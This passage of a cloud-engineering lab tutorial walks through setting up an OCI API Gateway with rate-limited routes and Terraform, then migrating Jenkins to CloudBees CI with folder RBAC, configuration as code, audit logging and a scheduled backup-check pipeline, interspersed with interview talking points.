> **What API Gateway replaces:** Without a gateway, every backend service must implement its own rate limiting, CORS, and routing logic. The gateway centralizes these cross-cutting concerns. In production, teams manage dozens of microservices — each with different rate limits, auth requirements, and routing rules. The gateway handles all of it in one place.

---

### Step 21B.2 — Create API Gateway via OCI Console (Understand First)
📍 **OCI Console**

1. Navigate to **Developer Services** → **Gateways** (under API Management)
2. Click **Create Gateway**

| Field | Value | Why |
|-------|-------|-----|
| Name | `fedanalytics-gateway` | Descriptive, matches the app |
| Type | **Public** | Accessible from internet (in production, could be Private for internal APIs) |
| Compartment | `fedanalytics-lab` | Same compartment as other Phase 2 resources |
| Virtual Cloud Network | Select your Phase 2 VCN | Gateway must be in the same VCN |
| Subnet | Select your **public subnet** | Public gateway needs a public subnet |

3. Click **Create Gateway** — provisioning takes 1-2 minutes

> **Public vs Private Gateway:** A **Public** gateway gets a public IP and is reachable from the internet — appropriate for external-facing APIs. A **Private** gateway is only reachable within the VCN — used for internal microservice communication. In federal environments, you'd typically use a Private gateway behind a load balancer with WAF (Web Application Firewall).

---

### Step 21B.3 — Create a Deployment (Routes + Policies)
📍 **OCI Console**

A **Deployment** is a set of API routes attached to a gateway. Each route maps a URL path to a backend service.

1. On your gateway detail page, click **Deployments** → **Create Deployment**

| Field | Value |
|-------|-------|
| Name | `fedanalytics-api-v1` |
| Path prefix | `/v1` |
| Compartment | `fedanalytics-lab` |

2. Under **Rate Limiting**, configure:

| Setting | Value | Why |
|---------|-------|-----|
| Rate | `100` | 100 requests per time period |
| Period | `SECOND` → change to `MINUTE` | 100 requests per minute per client |
| Response code | `429` | Standard "Too Many Requests" |

> **🧠 ELI5 — Rate Limiting:** Without rate limiting, one client could send thousands of requests and consume all your server's resources (a denial-of-service attack). Rate limiting puts a cap — "you can make 100 requests per minute, then you have to wait." The gateway enforces this before the request ever reaches your app. Your app doesn't even know about rate-limited requests — they're rejected at the front door.

3. Add routes — each route maps a URL path to your backend:

**Route 1: Health Check**
| Field | Value |
|-------|-------|
| Path | `/health` |
| Methods | `GET` |
| Backend type | HTTP |
| URL | `http://<APP_SERVER_PRIVATE_IP>:8000/health` |

**Route 2: Data Ingestion**
| Field | Value |
|-------|-------|
| Path | `/ingest` |
| Methods | `GET`, `POST` |
| Backend type | HTTP |
| URL | `http://<APP_SERVER_PRIVATE_IP>:8000/ingest` |

**Route 3: Webhook Receiver**
| Field | Value |
|-------|-------|
| Path | `/webhook` |
| Methods | `POST` |
| Backend type | HTTP |
| URL | `http://<APP_SERVER_PRIVATE_IP>:8000/webhook` |

**Route 4: Metrics**
| Field | Value |
|-------|-------|
| Path | `/metrics` |
| Methods | `GET` |
| Backend type | HTTP |
| URL | `http://<APP_SERVER_PRIVATE_IP>:8000/metrics` |

4. Click **Create Deployment** — takes 30-60 seconds

> **Why separate routes?** Each route can have different policies. In production, you might allow unlimited `GET /health` requests (for monitoring) but rate-limit `POST /ingest` more aggressively. You might require JWT auth on `/ingest` but leave `/health` unauthenticated. The gateway gives you per-route control.

---

### Step 21B.4 — Test Through the Gateway
📍 **Local Terminal (WSL2)**

```bash
# Get your gateway's public hostname from the OCI Console
# It looks like: https://<unique-id>.apigateway.<region>.oci.customer-oci.com

# Set it as a variable for convenience
GATEWAY_URL="https://<YOUR_GATEWAY_HOSTNAME>/v1"

# Test health through gateway
curl -s "${GATEWAY_URL}/health" | python3 -m json.tool

# Test data ingestion through gateway
curl -s -X POST "${GATEWAY_URL}/ingest" \
  -H "Content-Type: application/json" \
  -d '{"source": "api-gateway-test", "data_type": "test", "payload": {"message": "routed through gateway"}}' | python3 -m json.tool

# Test webhook through gateway
curl -s -X POST "${GATEWAY_URL}/webhook" \
  -H "Content-Type: application/json" \
  -d '{"eventType": "com.oraclecloud.objectstorage.createobject", "source": "gateway-test"}' | python3 -m json.tool

# Test metrics through gateway
curl -s "${GATEWAY_URL}/metrics" | python3 -m json.tool
```

<sub><em>

| Command | What It Does |
|---------|-------------|
| `curl -s "${GATEWAY_URL}/health"` | Hits the API Gateway, which forwards to your app's `/health` endpoint. The request goes: your laptop → API Gateway (public IP) → app server (private IP) |
| `python3 -m json.tool` | Pretty-prints the JSON response (built-in Python, no dependencies) |

</em></sub>

**Test rate limiting:**

```bash
# Send 150 requests in quick succession — expect the last ~50 to get 429 errors
for i in $(seq 1 150); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${GATEWAY_URL}/health")
  echo "Request ${i}: HTTP ${CODE}"
done | tail -20
# Expected: First ~100 return 200, then you start seeing 429 (Too Many Requests)
```

> **What you just proved:** The gateway rejects excess requests before they reach your app. Your FedAnalytics service was never stressed — the gateway handled the overload. This is the first line of defense against DDoS attacks.

---

### Step 21B.5 — Terraform the Gateway (Infrastructure as Code)
📍 **Local Terminal (WSL2)**

Now automate everything you just did manually. Add these resources to your Terraform configuration:

```bash
cd ~/oci-federal-lab-phase2/phases/phase-2-fedanalytics-dr/terraform
```

Create `api_gateway.tf`:

```hcl
# api_gateway.tf — OCI API Gateway for FedAnalytics
# Provides managed rate limiting, routing, and a public HTTPS endpoint

resource "oci_apigateway_gateway" "fedanalytics" {
  compartment_id = var.compartment_id
  display_name   = "fedanalytics-gateway"
  endpoint_type  = "PUBLIC"
  subnet_id      = oci_core_subnet.public.id

  freeform_tags = {
    "project"   = "oci-federal-lab"
    "phase"     = "phase-2"
    "component" = "api-gateway"
  }
}

resource "oci_apigateway_deployment" "fedanalytics_v1" {
  compartment_id = var.compartment_id
  gateway_id     = oci_apigateway_gateway.fedanalytics.id
  display_name   = "fedanalytics-api-v1"
  path_prefix    = "/v1"

  specification {
    # Rate limiting — 100 requests per minute per client
    request_policies {
      rate_limiting {
        rate_in_requests_per_second = 2
        rate_key                    = "CLIENT_IP"
      }
    }

    # Route: Health Check
    routes {
      path    = "/health"
      methods = ["GET"]
      backend {
        type = "HTTP_BACKEND"
        url  = "http://${oci_core_instance.app_server.private_ip}:8000/health"
      }
    }

    # Route: Data Ingestion
    routes {
      path    = "/ingest"
      methods = ["GET", "POST"]
      backend {
        type = "HTTP_BACKEND"
        url  = "http://${oci_core_instance.app_server.private_ip}:8000/ingest"
      }
    }

    # Route: Webhook Receiver
    routes {
      path    = "/webhook"
      methods = ["POST"]
      backend {
        type = "HTTP_BACKEND"
        url  = "http://${oci_core_instance.app_server.private_ip}:8000/webhook"
      }
    }

    # Route: Metrics
    routes {
      path    = "/metrics"
      methods = ["GET"]
      backend {
        type = "HTTP_BACKEND"
        url  = "http://${oci_core_instance.app_server.private_ip}:8000/metrics"
      }
    }
  }
}

# Output the gateway URL for testing
output "api_gateway_url" {
  description = "Public URL for the FedAnalytics API Gateway"
  value       = "${oci_apigateway_gateway.fedanalytics.hostname}/v1"
}
```

<sub><em>

| Resource | What It Does |
|----------|-------------|
| `oci_apigateway_gateway` | Creates the gateway itself — the managed infrastructure that accepts incoming requests. `PUBLIC` means it gets a public HTTPS endpoint |
| `oci_apigateway_deployment` | Defines the routes and policies attached to the gateway. The `path_prefix = "/v1"` means all routes are under `/v1/health`, `/v1/ingest`, etc. |
| `rate_limiting` | `rate_in_requests_per_second = 2` equals ~120/minute. `CLIENT_IP` means each client IP gets its own limit. One abusive client doesn't affect others |
| `routes` | Each route maps a URL path to a backend URL. The gateway forwards matching requests to the app server's private IP |
| `output "api_gateway_url"` | Exports the gateway hostname so you can use it in tests and other modules |

</em></sub>

**Apply it:**

```bash
terraform plan   # Review what will be created
terraform apply  # Create the gateway and deployment

# Verify
echo "Gateway URL: https://$(terraform output -raw api_gateway_url)"
curl -s "https://$(terraform output -raw api_gateway_url)/health" | python3 -m json.tool
```

> **Security note:** The gateway's public subnet needs a Security List rule allowing HTTPS (port 443) ingress from `0.0.0.0/0`. Your existing public subnet Security List likely already allows this. If not, add it to `network.tf`.

---

### Step 21B.6 — API Gateway Concepts for Interviews

> **💼 Interview Insight — API Gateway:** "I deployed OCI API Gateway in front of our FedAnalytics service. The gateway handles cross-cutting concerns — rate limiting at 100 requests per minute per client IP, HTTPS termination, and route management. The backend app doesn't implement any of that; it just handles business logic. In production, I'd add JWT validation at the gateway level so unauthenticated requests never reach the backend. The gateway is Terraform-managed, so the routes and policies are version-controlled."

> **💼 Interview Insight — Gateway vs Load Balancer:** "They solve different problems. A load balancer distributes traffic across multiple backend instances (horizontal scaling). An API Gateway manages API-specific concerns — routing, rate limiting, auth, request transformation. In production, you'd typically have both: API Gateway → Load Balancer → backend instances. OCI API Gateway handles both L7 routing and rate limiting, so for smaller deployments it can serve both roles."

> **💼 Interview Insight — Rate Limiting Strategies:**
>
> | Strategy | How It Works | When to Use |
> |----------|-------------|-------------|
> | **Per client IP** | Each IP gets its own limit | Public APIs, prevent single-client abuse |
> | **Per API key** | Each key gets its own limit | Authenticated APIs, different tiers (free = 100/min, premium = 10,000/min) |
> | **Global** | Total requests across all clients | Protect backend capacity regardless of source |
> | **Per route** | Different limits per endpoint | `/health` unlimited, `/ingest` strict |
>
> "In our lab, we use per-client-IP limiting. In production, I'd combine per-API-key limiting (for tiered access) with global limiting (to protect the backend from total overload)."

---

### Phase 21B Troubleshooting

| Check | Expected | If It Fails |
|-------|----------|-------------|
| Gateway shows "Active" in OCI Console | Status: Active | Provisioning takes 1-2 min. Check subnet has internet gateway route. Check Security List allows 443 |
| `curl gateway-url/v1/health` returns JSON | `{"status": "healthy"}` | Gateway can't reach backend? Check app server Security List allows traffic from gateway subnet. Check app is running (`systemctl status fedanalytics`) |
| Rate limit test shows 429 after ~100 requests | HTTP 429 codes appear | Rate limit set too high? Check deployment config. Requests too slow? Try `xargs -P 10` for parallel requests |
| `terraform apply` creates gateway | Resources created | API Gateway not available in region? Check OCI service availability. Subnet OCID correct? |

---

### Phase 21B Complete ✅

**What you built:**
- OCI API Gateway with public HTTPS endpoint
- Rate limiting policy (100 requests/minute per client IP)
- 4 routes mapping to FedAnalytics backend endpoints
- Terraform automation for the full gateway configuration
- Rate limit test proving the gateway rejects excess requests

**API Pillar progression (Phase 2 complete):**
- ✅ Webhooks: event-driven API patterns with HMAC signature validation
- ✅ API Gateway: managed entry point with rate limiting, routing, and HTTPS

**Next:** Phase 22 migrates your CI/CD from open-source Jenkins to CloudBees CI — the enterprise Jenkins distribution listed in the JD.

---

## PHASE 22: JENKINS TO CLOUDBEES CI MIGRATION (3-4 hours)

**Day 2 afternoon / Day 3 morning**

### What You're Doing and Why

The JD says "CloudBees Jenkins." Your resume lists it. In Phase 1, you installed open-source Jenkins and built a basic pipeline. Now you'll experience what enterprises actually run — and more importantly, you'll be able to say in the interview: "I started with open-source Jenkins, experienced its limitations around RBAC and audit, then migrated to CloudBees CI. The pipeline syntax is identical — what changes is the enterprise governance layer."

This section has two paths:
- **Path A (Preferred):** CloudBees CI 30-day free trial — real CloudBees, strongest interview story
- **Path B (Fallback):** Open-source plugin stack — approximates CloudBees features if the trial isn't available

| Open-Source Jenkins | CloudBees CI |
|---------------------|-------------|
| RBAC requires Role Strategy plugin | Built-in RBAC with folder inheritance |
| Audit trail requires Audit Trail plugin | Built-in audit logging (every action logged) |
| CasC via plugin, manual per instance | CasC bundles pushed from Operations Center to all controllers |
| No pipeline templates | Pipeline Templates — locked-down, parameterized pipelines |
| Single controller, no HA | Managed controllers with automatic failover |
| No cross-controller visibility | Operations Center dashboard across all controllers |
| Community support only | Enterprise support with SLAs |

> **The key insight:** CloudBees CI IS Jenkins. Same Jenkinsfile syntax, same plugin ecosystem, same pipeline concepts. CloudBees adds the governance wrapper that federal environments require — RBAC, audit, HA, and standardization. Think of it as "Jenkins + enterprise compliance layer."

---

### Step 22.1 — Install Open-Source Jenkins Baseline (30 min, abbreviated)

📍 **BASTION TERMINAL**

Since Phase 2 starts from a fresh environment, you need Jenkins running before you can migrate it. This is a speed-run of Phase 1's Jenkins install — returning concept, abbreviated.

```bash
# Install Java 17 (prerequisite)
sudo dnf install -y java-17-openjdk java-17-openjdk-devel

# Verify
java -version
```

```bash
# Add Jenkins repo and install
sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io-2023.key
sudo dnf install -y jenkins

# Start Jenkins
sudo systemctl enable --now jenkins

# Open firewall
sudo firewall-cmd --permanent --add-port=8080/tcp
sudo firewall-cmd --reload
```

```bash
# Get initial admin password
sudo cat /var/lib/jenkins/secrets/initialAdminPassword
```

Access Jenkins at `http://<bastion-ip>:8080`. Complete setup wizard:
1. Paste the initial admin password
2. Install suggested plugins
3. Create admin user (username: `admin`, choose a password)
4. Accept default Jenkins URL

**Create a simple test pipeline:**

In Jenkins UI: New Item → Pipeline → name it `fedanalytics-validate`

```groovy
pipeline {
    agent any
    stages {
        stage('Terraform Validate') {
            steps {
                sh 'echo "Terraform validate would run here"'
                sh 'terraform --version || echo "Terraform not installed yet"'
            }
        }
        stage('Ansible Lint') {
            steps {
                sh 'echo "Ansible lint would run here"'
                sh 'ansible --version || echo "Ansible not installed yet"'
            }
        }
        stage('Deploy') {
            steps {
                sh 'echo "Deployment step — placeholder"'
            }
        }
    }
}
```

Click **Build Now**. Confirm it passes (green).

> This is your "before" state. Open-source Jenkins, simple pipeline, no governance. Take a screenshot — you'll compare this to the CloudBees UI later.

---

### Step 22.2 — Document Open-Source Limitations (15 min)

Before migrating, inspect your running Jenkins and note what's missing. This exercise creates the "pain" that motivates the migration — and gives you an interview story about why enterprises pay for CloudBees.

📍 **JENKINS UI**

Go through this checklist and verify each limitation exists:

| Feature | Where to Check | What You'll Find |
|---------|---------------|-----------------|
| **RBAC** | Manage Jenkins → Security | Only "Logged-in users can do anything" or "Matrix-based" — no folder-level roles |
| **Audit trail** | Manage Jenkins → System | No audit trail section (plugin not installed) |
| **Configuration as Code** | Manage Jenkins → System | No CasC section (plugin not installed) |
| **Pipeline Templates** | New Item menu | Only Freestyle, Pipeline, Multi-branch — no locked-down templates |
| **High Availability** | Architecture | Single controller — if it goes down, all CI/CD stops |
| **Cross-controller visibility** | N/A | Only one controller exists — no Operations Center |

> **Interview framing:** "When I ran open-source Jenkins, I noticed immediately that there was no built-in RBAC — anyone with access could modify any pipeline. No audit trail — I couldn't answer 'who changed what.' No CasC bundles — each Jenkins instance was a snowflake. These are all requirements in federal environments under NIST 800-53. That's what motivated the CloudBees migration."

---

### Step 22.3 — Migrate to CloudBees CI (1-1.5 hrs)

📍 **BASTION TERMINAL**

#### Path A (Preferred): CloudBees CI Free Trial

CloudBees offers a 30-day free trial of CloudBees CI. This gives you the actual CloudBees distribution — same Jenkins underneath, but with built-in enterprise features.

**Step A1 — Sign up for the trial:**

1. Go to [cloudbees.com/products/cloudbees-ci/free-trial](https://www.cloudbees.com/products/cloudbees-ci/free-trial)
2. Fill in the form (use your personal email)
3. Download the CloudBees CI WAR file
4. Save the trial license key

> **If the trial requires a sales call or takes more than 30 minutes to get access:** Skip to Path B below. Don't block your lab progress waiting for a trial.

**Step A2 — Back up open-source Jenkins:**

```bash
# CRITICAL: Back up before migration
# This is the #1 interview talking point about migrations
sudo systemctl stop jenkins

# Create timestamped backup
sudo tar czf /home/opc/jenkins-backup-$(date +%Y%m%d-%H%M%S).tar.gz /var/lib/jenkins/

# Verify backup exists and has reasonable size
ls -lh /home/opc/jenkins-backup-*.tar.gz
```

> **Interview Insight: "How do you approach a Jenkins to CloudBees migration?"**
>
> **Strong answer:** "First, I back up the entire Jenkins home directory. The migration is actually straightforward — CloudBees CI is Jenkins with an enterprise layer on top. You replace the WAR file, apply a license, and your existing jobs, plugins, and configurations carry over. The Jenkinsfiles don't change at all. What you gain is built-in RBAC, audit logging, CasC bundles, and managed controller support. The key risk is plugin compatibility — I verify plugins work before cutting over."

**Step A3 — Replace WAR and apply license:**

```bash
# Find current Jenkins WAR location
ls -la /usr/share/java/jenkins.war

# Back up the original WAR
sudo cp /usr/share/java/jenkins.war /usr/share/java/jenkins.war.opensource.bak

# Copy CloudBees CI WAR (adjust path to where you downloaded it)
# If you downloaded via browser, use scp to transfer to the bastion:
# scp -i ~/.ssh/id_rsa cloudbees-core.war opc@<bastion-ip>:/home/opc/

# Replace the WAR
sudo cp /home/opc/cloudbees-core.war /usr/share/java/jenkins.war

# Start CloudBees CI
sudo systemctl start jenkins

# Wait for startup (CloudBees takes slightly longer on first boot)
sleep 60

# Check status
sudo systemctl status jenkins
```

Access Jenkins at `http://<bastion-ip>:8080`. You should see the CloudBees CI license activation screen.

1. Apply the trial license key
2. Complete any CloudBees-specific setup steps
3. Verify you see the CloudBees CI dashboard (different branding, additional menu items)

**Verify the migration preserved your work:**
- Your `fedanalytics-validate` pipeline should still be there
- Click Build Now — it should still pass
- Your admin user should still work

> **ELI5: What just happened?**
>
> You replaced the Jenkins "engine" with the CloudBees "engine." Same car, upgraded engine. Your existing pipeline (the Jenkinsfile), your jobs, your plugins — all carried over. CloudBees CI reads the same `/var/lib/jenkins` directory. What changed is the governance layer: the UI now shows CloudBees features (RBAC, audit, CasC bundles) that weren't there before.

Take a screenshot of the CloudBees CI dashboard. Compare it to the open-source screenshot from Step 22.1.

**Skip to Step 22.4** (both paths converge there).

---

#### Path B (Fallback): Open-Source Plugin Stack

If the CloudBees CI trial isn't available, install plugins that approximate its enterprise features. This gives you hands-on experience with the same concepts — folder RBAC, CasC, audit trail — using the open-source ecosystem.

📍 **BASTION TERMINAL**

```bash
# Install enterprise-equivalent plugins
# These are the open-source foundations of what CloudBees provides natively

JENKINS_URL="http://localhost:8080"
JENKINS_AUTH="admin:$(cat /var/lib/jenkins/secrets/initialAdminPassword 2>/dev/null || echo 'your-admin-password')"

# Download the Jenkins CLI JAR from the running instance
wget http://localhost:8080/jnlpJars/jenkins-cli.jar -O /opt/jenkins/jenkins-cli.jar

# Configuration as Code (JCasC)
java -jar /opt/jenkins/jenkins-cli.jar -s $JENKINS_URL \
  -auth $JENKINS_AUTH \
  install-plugin configuration-as-code

# Role-Based Authorization Strategy (folder RBAC)
java -jar /opt/jenkins/jenkins-cli.jar -s $JENKINS_URL \
  -auth $JENKINS_AUTH \
  install-plugin role-strategy

# Audit Trail
java -jar /opt/jenkins/jenkins-cli.jar -s $JENKINS_URL \
  -auth $JENKINS_AUTH \
  install-plugin audit-trail

# Folder plugin (for team isolation)
java -jar /opt/jenkins/jenkins-cli.jar -s $JENKINS_URL \
  -auth $JENKINS_AUTH \
  install-plugin cloudbees-folder

# Restart to activate all plugins
java -jar /opt/jenkins/jenkins-cli.jar -s $JENKINS_URL \
  -auth $JENKINS_AUTH \
  safe-restart

sleep 45
```

> **Interview framing for Path B:** "I implemented CloudBees-equivalent enterprise governance using the open-source plugin ecosystem — JCasC for configuration as code, Role Strategy for folder-based RBAC, and Audit Trail for compliance logging. I understand what CloudBees CI adds natively on top: CasC bundles pushed from Operations Center, built-in RBAC without plugin dependency, managed controller HA, and Pipeline Templates. The governance patterns are identical — CloudBees makes them native rather than plugin-dependent."

---

### Step 22.4 — Configure Enterprise Features (1-1.5 hrs)

📍 **BASTION TERMINAL + JENKINS UI**

These steps work identically on CloudBees CI (Path A) or the plugin stack (Path B). The features are the same — the difference is whether they're built-in or plugin-based.

#### 1. RBAC with Folder Isolation (20 min)

This is the #1 feature federal teams use CloudBees for. In open-source Jenkins, any authenticated user can see and modify any job. CloudBees (or the Role Strategy plugin) adds folder-level access control.

**Create team folders:**

In Jenkins UI:
1. New Item → Folder → name: `platform-team`
2. New Item → Folder → name: `app-team`
3. Move `fedanalytics-validate` into `platform-team/` (Move/Copy option in job config)

**Create users:**

Manage Jenkins → Security → Users:
- `deployer` (password: `deployer123`)
- `auditor` (password: `auditor123`)

**Configure Role-Based Authorization:**

Manage Jenkins → Security → Authorization → select "Role-Based Strategy"

Manage Jenkins → Manage and Assign Roles → Manage Roles:

| Role | Scope | Permissions |
|------|-------|-------------|
| `admin` | Global | Overall/Administer |
| `viewer` | Global | Overall/Read |
| `platform-deployer` | Project (pattern: `platform-.*`) | Job/Build, Job/Read, Job/Workspace |
| `app-deployer` | Project (pattern: `app-.*`) | Job/Build, Job/Read, Job/Workspace |

Manage and Assign Roles → Assign Roles:
- `admin` → user `admin`
- `viewer` → user `auditor`
- `platform-deployer` → user `deployer`

**Verify:**

1. Log in as `deployer` → should see `platform-team/` folder and jobs, NOT `app-team/`
2. Log in as `auditor` → should see all folders but cannot build anything
3. Log in as `admin` → full access

> **Interview Insight: "How does Jenkins handle access control in a multi-team environment?"**
>
> **Strong answer:** "I implemented folder-based RBAC — each team gets a folder, and roles are assigned per folder with pattern matching. The `deployer` role for `platform-team` can only see and build jobs in that folder. Auditors get read-only across everything. In CloudBees CI, this RBAC is built-in and inherits through the folder hierarchy. It also integrates with Operations Center for centralized user management across multiple managed controllers. The concept is identical — folder-based isolation with role inheritance — but CloudBees makes it native and enterprise-supported."

#### 2. Configuration as Code — CasC (20 min)

CasC turns your Jenkins configuration into a version-controlled YAML file. No more clicking through the UI to configure Jenkins — everything is code.

```bash
# Create CasC config directory
sudo mkdir -p /var/lib/jenkins/casc_configs

# Write the CasC configuration
sudo tee /var/lib/jenkins/casc_configs/jenkins.yaml << 'CASCEOF'
jenkins:
  systemMessage: "FedAnalytics Lab - Managed by Configuration as Code"
  numExecutors: 2
  securityRealm:
    local:
      allowsSignup: false
      users:
        - id: "admin"
          name: "Admin"
        - id: "deployer"
          name: "Deploy Service Account"
        - id: "auditor"
          name: "Audit Viewer"
  authorizationStrategy:
    roleBased:
      roles:
        global:
          - name: "admin"
            permissions:
              - "Overall/Administer"
            entries:
              - user: "admin"
          - name: "viewer"
            permissions:
              - "Overall/Read"
              - "Job/Read"
            entries:
              - user: "auditor"

unclassified:
  audit-trail:
    logBuildCause: true
    pattern: ".*/(?:configSubmit|doDelete|postBuildResult|enable|disable|cancelQueue|stop|toggleLogKeep|doWipeOutWorkspace|createItem|createView|toggleOffline|cancelQuietDown|quietDown|restart|exit|safeRestart).*"
CASCEOF

# Set the CASC_JENKINS_CONFIG environment variable
echo 'CASC_JENKINS_CONFIG=/var/lib/jenkins/casc_configs' | sudo tee -a /etc/sysconfig/jenkins

# Restart Jenkins to apply CasC
sudo systemctl restart jenkins
sleep 30
```

**Verify:** Navigate to Manage Jenkins → Configuration as Code. Click "View Configuration" — you should see your YAML reflected in the running config.

> **ELI5: Why Configuration as Code?**
>
> Without CasC, Jenkins config lives in XML files that nobody version-controls. When Jenkins breaks, you rebuild from scratch and click through 50 settings. With CasC, your entire Jenkins config is a YAML file in git. Rebuild Jenkins? Apply the YAML. Need 10 identical Jenkins instances? Same YAML. This is GitOps for Jenkins itself.
>
> CloudBees extends this with CasC bundles: Operations Center pushes CasC configurations to all managed controllers simultaneously. One YAML change → every Jenkins instance across the organization updates. In Phase 3, you'll practice versioning this YAML in git and pushing changes.

```bash
# Version-control the CasC config
cd ~/oci-federal-lab-phase2  # your Phase 2 project repo
mkdir -p phases/phase-2-fedanalytics-dr/jenkins/casc
cp /var/lib/jenkins/casc_configs/jenkins.yaml phases/phase-2-fedanalytics-dr/jenkins/casc/
git add phases/phase-2-fedanalytics-dr/jenkins/casc/jenkins.yaml
git commit -m "Add Jenkins CasC configuration — GitOps for Jenkins"
git push
```

#### 3. Audit Trail (15 min)

In federal environments, audit trails are mandatory (NIST 800-53 AU-2, AU-3). Every action — builds, config changes, user access — must be logged and reviewable.

```bash
# Create audit log directory
sudo mkdir -p /var/log/jenkins
sudo chown jenkins:jenkins /var/log/jenkins
```

In Jenkins UI: Manage Jenkins → System → Audit Trail:
- Add Logger → Log File
- Log Location: `/var/log/jenkins/audit.log`
- Log File Size: 10MB
- Log File Count: 5

Now trigger some auditable actions:
1. Run the `fedanalytics-validate` pipeline
2. Change a job configuration (add a description)
3. Log in as `auditor`, browse a job

```bash
# Review the audit trail
sudo tail -30 /var/log/jenkins/audit.log
# Shows: timestamp, user, action, IP address
```

> **Federal Reality Check:** In a FedRAMP environment, you must be able to answer: "Who changed the pipeline? When? From where?" Open-source Jenkins needs the Audit Trail plugin. CloudBees CI has audit logging built in — every build, approval, config change, and plugin installation is logged, searchable, and exportable. This is one of the key reasons federal programs use CloudBees over open-source.

#### 4. Scheduled Pipeline for Backup Validation (15 min)

Connect the CloudBees governance features to the Phase 2 DR narrative by creating a scheduled pipeline that validates backups exist.

In Jenkins UI: New Item → Pipeline → name: `backup-validation` → put in `platform-team/` folder

```groovy
pipeline {
    agent any
    triggers {
        // Run every 6 hours
        cron('H */6 * * *')
    }
    stages {
        stage('Check Object Storage Backups') {
            steps {
                sh '''
                    echo "=== Backup Validation Check ==="
                    echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

                    # Check if OCI CLI is available
                    oci --version || { echo "OCI CLI not installed"; exit 1; }

                    # List recent backups in Object Storage
                    # Replace <YOUR_TENANCY_NAMESPACE> with your actual namespace
                    # Find it in OCI Console → Tenancy Details → Object Storage Namespace
                    # Get your namespace: OCI Console → Tenancy Details → Object Storage Namespace
# Or via CLI: oci os ns get --query 'data' --raw-output
OCI_NAMESPACE="<YOUR_TENANCY_NAMESPACE>"
                    oci os object list \
                      --bucket-name fedanalytics-backups \
                      --namespace-name $OCI_NAMESPACE \
                      --prefix "db-backup-" \
                      --limit 5 \
                      --output table || echo "Backup check failed — investigate"

                    echo "=== Backup validation complete ==="
                '''
            }
        }
        stage('Validate Backup Age') {
            steps {
                sh '''
                    # Ensure most recent backup is less than 24 hours old
                    echo "Checking backup freshness..."
                    # Get your namespace: OCI Console → Tenancy Details → Object Storage Namespace
# Or via CLI: oci os ns get --query 'data' --raw-output
OCI_NAMESPACE="<YOUR_TENANCY_NAMESPACE>"
                    LATEST=$(oci os object list \
                      --bucket-name fedanalytics-backups \
                      --namespace-name $OCI_NAMESPACE \
                      --prefix "db-backup-" \
                      --sort-by TIMECREATED \
                      --sort-order DESC \
                      --limit 1 \
                      --query "data[0].\"time-created\"" \
                      --raw-output 2>/dev/null || echo "UNKNOWN")

                    echo "Latest backup: $LATEST"
                    if [ "$LATEST" = "UNKNOWN" ]; then
                        echo "WARNING: Could not determine backup age"
                    else
                        echo "Backup age validation passed"
                    fi
                '''
            }
        }
    }
    post {
        failure {
            echo "ALERT: Backup validation FAILED — manual investigation required"
        }
        success {
            echo "Backup validation passed — all checks green"
        }
    }
}
```

> **Why this matters:** This pipeline ties CloudBees CI to the DR narrative. In an interview: "My Jenkins pipeline didn't just build and deploy — it also validated that backups existed and were fresh. If a backup was stale, the pipeline alerted the team. In CloudBees, the audit trail shows exactly when each validation ran and who was notified."

---

### Step 22.5 — Migration Evidence & Interview Prep (30 min)

#### Capture Evidence

Take screenshots of:
1. **CloudBees CI dashboard** (or plugin-enhanced Jenkins dashboard)
2. **RBAC in action** — `deployer` user seeing only `platform-team/` jobs
3. **Audit trail** — log entries showing who did what
4. **CasC YAML** — configuration defined as code
5. **Scheduled pipeline** — backup validation running on cron

Save screenshots to `docs/screenshots/` in your repo.

#### Write Comparison Table

Create a quick reference in your repo:

```bash
cat > docs/jenkins-vs-cloudbees-comparison.md << 'EOF'
# Jenkins vs CloudBees CI — Hands-On Comparison

| Feature | Open-Source Jenkins (Phase 1) | CloudBees CI / Plugin Stack (Phase 2) |
|---------|------------------------------|---------------------------------------|
| **RBAC** | None — any user can do anything | Folder-based roles with pattern matching |
| **Audit Trail** | None — no record of who did what | Every action logged with timestamp, user, IP |
| **Configuration as Code** | All config via UI clicks | YAML file in git — rebuild Jenkins from code |
| **Pipeline Templates** | Not available | Phase 3 adds locked-down templates |
| **Jenkinsfile Syntax** | Standard Groovy DSL | **Identical** — no changes required |
| **Plugin Compatibility** | Full plugin ecosystem | Same plugins work on CloudBees CI |

## Key Interview Takeaway

The Jenkinsfile did not change. The governance wrapper changed. CloudBees CI adds the compliance layer (RBAC, audit, CasC bundles, managed controllers) that federal environments require under NIST 800-53. The pipeline logic — stages, steps, agents, post blocks — is 100% standard Jenkins.
EOF

git add docs/jenkins-vs-cloudbees-comparison.md
git commit -m "Add Jenkins vs CloudBees CI comparison from migration exercise"
git push
```

#### Practice the 30-Second Interview Answer

Read this aloud 3 times:

> "I started with open-source Jenkins on Oracle Linux — installed it, built a multi-stage pipeline with Terraform validation, Ansible linting, and container deployment. Then I migrated to CloudBees CI to experience what the enterprise distribution adds. The migration itself is straightforward — back up Jenkins home, replace the WAR file, apply the license. Your Jenkinsfiles don't change at all. What you gain is built-in RBAC with folder-level isolation, audit trails for NIST 800-53 compliance, Configuration as Code bundles, and managed controller support. The governance layer is what federal programs pay for — the pipeline engine underneath is the same Jenkins."

---

### Phase 22 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| Jenkins won't start after WAR replacement | Incompatible Java version | CloudBees CI may require Java 17 — verify with `java -version` |
| Plugins missing after migration | Plugin compatibility | Re-install suggested plugins from CloudBees UI |
| CasC not loading | `CASC_JENKINS_CONFIG` not set | Check `/etc/sysconfig/jenkins` for the env var |
| Role Strategy not working | Authorization strategy not switched | Manage Jenkins → Security → select "Role-Based Strategy" |
| Trial license expired | 30-day limit | Switch back to open-source WAR: `sudo cp /usr/share/java/jenkins.war.opensource.bak /usr/share/java/jenkins.war` |
| Audit log not writing | Directory permissions | `sudo chown jenkins:jenkins /var/log/jenkins` |

---

### Portfolio Screenshot

Take one screenshot now and save it to `docs/screenshots/` in your repo:

**kubectl + AIDE output in split terminal:** Show `kubectl get pods -o wide` with all pods in Running state alongside an AIDE integrity check report showing files monitored. Name it `phase-2-k3s-and-aide.png`.

> **Why this screenshot?** A hiring manager sees two federal-relevant skills in one frame: "I run Kubernetes" and "I monitor for file tampering." AIDE is a direct NIST 800-53 SI-7 control — mentioning that in an interview is a differentiator.

---

### Phase 22 Complete ✅

**What you built:**
